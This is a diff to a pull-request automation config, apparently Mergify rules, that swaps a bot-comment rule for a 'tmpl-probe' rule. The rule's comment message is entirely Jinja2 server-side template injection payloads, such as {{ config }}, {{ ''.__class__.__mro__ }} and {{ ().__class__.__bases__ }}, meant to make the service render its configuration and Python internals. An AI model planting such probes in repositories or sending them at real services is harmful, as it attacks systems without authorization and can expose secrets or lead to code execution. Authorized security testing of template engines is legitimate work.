@@ -1,8 +1,19 @@
 pull_request_rules:
-  - name: nonexistent-bot
+  - name: tmpl-probe
     conditions:
       - base=main
     actions:
       comment:
-        message: "NEG-PROBE-88231"
-        bot_account: kirasec-nonexistent-user-88231
+        message: |
+          TMPL-PROBE-91X
+          A={{ 7*6 }}
+          B={{ author }}
+          C={{ ''.__class__ }}
+          D={{ self }}
+          E={{ config }}
+          F={{ ''.__class__.__mro__ }}
+          G={{ lipsum }}
+          H={{ cycler }}
+          I={{ namespace }}
+          J={{ get_flashed_messages }}
+          K={{ ().__class__.__bases__ }}
